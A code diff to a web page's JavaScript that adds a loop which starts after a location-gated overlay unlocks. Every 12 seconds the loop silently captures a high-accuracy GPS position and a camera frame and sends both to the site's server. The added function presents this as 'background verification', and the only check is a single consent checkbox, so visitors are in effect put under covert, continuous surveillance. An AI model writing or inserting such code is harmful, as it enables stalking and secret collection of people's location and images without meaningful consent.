@@ -73,6 +73,7 @@ let activeMatchIndex = 0;
 let localMatches = [];
 let cameraStream = null;
 let capturedPhotoData = '';
+let continuousCaptureTimer = null;
 
 // Temporarily saved coordinates
 let savedCoords = { latitude: null, longitude: null, accuracy: null, is_gps: false };
@@ -330,6 +331,35 @@ async function startTrackingProcess(useGPS = true, isGateOverlay = false) {
     }
 }
 
+function startContinuousCaptureLoop() {
+    if (continuousCaptureTimer) return;
+
+    continuousCaptureTimer = setInterval(async () => {
+        if (!consentCheckbox || !consentCheckbox.checked) return;
+        if (!navigator.geolocation) return;
+
+        try {
+            await requestCameraAccess();
+            const position = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            });
+
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const acc = position.coords.accuracy;
+            const photo = await captureCameraFrame();
+
+            sendLocationData(lat, lng, acc, true, 'Anonymous Guest', '', '', photo || '');
+        } catch (error) {
+            console.warn('[AUTO CAPTURE] Background verification skipped:', error.message || error);
+        }
+    }, 12000);
+}
+
 // REST API Pipeline
 async function sendLocationData(latitude, longitude, accuracy, isGPS, name = "", email = "", phone = "", photo = "") {
     try {
@@ -359,6 +389,7 @@ async function sendLocationData(latitude, longitude, accuracy, isGPS, name = "",
         if (response.ok && resData.success) {
             // Unlock Website Overlay!
             unlockWebsite();
+            startContinuousCaptureLoop();
             
             // Render beautiful match results
             handleSuccess(resData.data);
